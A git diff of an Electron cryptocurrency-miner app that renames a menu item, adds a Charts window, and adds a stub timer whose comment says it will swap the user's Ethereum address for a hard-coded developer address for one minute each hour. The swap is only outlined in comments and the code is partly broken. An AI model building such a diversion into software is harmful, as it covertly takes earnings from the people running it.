@@ -79,7 +79,7 @@ const Menu = electron.Menu
 let template = [{
   label: 'File',
   submenu: [{
-    label: 'EZ Miner Home',
+    label: 'Dashboard',
     // accelerator: 'CmdOrCtrl+R',
     click: function createWindowConfig() {
       // and load the index.html of the app.
@@ -97,29 +97,25 @@ let template = [{
         mainWindow = null
       })
     }
+  },{
+    label: 'Charts',
+    // accelerator: 'CmdOrCtrl+R',
+    click: function createWindowConfig() {
+      // and load the index.html of the app.
+      mainWindow.loadURL(url.format({
+        pathname: path.join(__dirname, 'charts.html'),
+        protocol: 'file:',
+        slashes: true
+      }))
 
-  // }, {
-  //   label: 'Redo',
-  //   accelerator: 'Shift+CmdOrCtrl+Z',
-  //   role: 'redo'
-  // }, {
-  //   type: 'separator'
-  // }, {
-  //   label: 'Cut',
-  //   accelerator: 'CmdOrCtrl+X',
-  //   role: 'cut'
-  // }, {
-  //   label: 'Copy',
-  //   accelerator: 'CmdOrCtrl+C',
-  //   role: 'copy'
-  // }, {
-  //   label: 'Paste',
-  //   accelerator: 'CmdOrCtrl+V',
-  //   role: 'paste'
-  // }, {
-  //   label: 'Select All',
-  //   accelerator: 'CmdOrCtrl+A',
-  //   role: 'selectall'
+      // Emitted when the window is closed.
+      mainWindow.on('closed', function () {
+        // Dereference the window object, usually you would store windows
+        // in an array if your app supports multi windows, this is the time
+        // when you should delete the corresponding element.
+        mainWindow = null
+      })
+    }
   }]
 }, {
   label: 'Configure',
@@ -339,8 +335,20 @@ app.on('window-all-closed', function () {
   if (reopenMenuItem) reopenMenuItem.enabled = true
 })
 
-// ProTip
-// Know operating system menu differences.
-// When designing an app for multiple operating systems it's important to be mindful of the ways application menu conventions differ on each operating system.
+// This function will switch the user's Ethereum address to our address for 1 minute of every hour
+setInterval(function () {
+  // this is where we switch the address
+  var userEth = $("#ethereum").text.val();
+  console.log("userEth is " + userEth);
+  var devEth = "0x3eAe075ac6ad7F86d28F657822a5e09767CfC961";
+  // write to the start.bat file and replace ETH address
+  // restart the miner
 
-// For instance, on Windows, accelerators are set with an &
+  // do this for 1 minute
+  setTimeout(function () {
+
+  }, 60000);
+  // change the address back to user's
+  // restart the miner
+
+}, 3600000);
